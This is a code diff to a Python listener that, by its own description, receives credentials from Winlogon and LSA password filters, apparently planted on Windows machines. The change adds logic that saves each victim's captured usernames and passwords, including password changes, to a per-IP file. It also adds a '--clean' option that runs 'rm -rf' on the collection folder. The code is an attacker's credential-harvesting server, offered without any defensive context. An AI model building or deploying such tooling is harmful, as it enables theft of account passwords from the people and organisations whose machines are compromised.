@@ -1,6 +1,7 @@
 import socket
 import threading
 import argparse
+import os
 
 print_lock = threading.Lock()
 
@@ -16,9 +17,17 @@ def handle_client(conn, addr):
         type = 'Password Change'
         username = strData[2:strData.find(':')]
     password = strData[strData.find(':')+1:strData.find(';end')]
-    print(f"\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n")
+    storage = f"\nSource: {addr}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
+    print(storage)
+    writeFile(storage, addr)
     if not data:
         print_lock.release()
+
+
+def writeFile(storage, addr):
+    ip = addr[0]
+    with open(f'creds/{ip}.txt', 'a') as f:
+        f.write(storage)
 
 
 def main():
@@ -41,7 +50,12 @@ def main():
     parser = argparse.ArgumentParser(description="Receive creds from Winlogon + LSA Filters")
     parser.add_argument('--ip', type=str, nargs='?', const=1, help="IP to listen on (default: 0.0.0.0)", default='0.0.0.0')
     parser.add_argument('--port', type=int, nargs='?', const=1, help="Port to listen on (default: 80)", default=80)
+    parser.add_argument('--clean', dest='clean', action='store_true')
+    parser.set_defaults(clean=False)
     args = parser.parse_args()
+
+    if args.clean:
+        os.system("rm -rf creds; mkdir creds")
 
     s = socket.socket() 
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
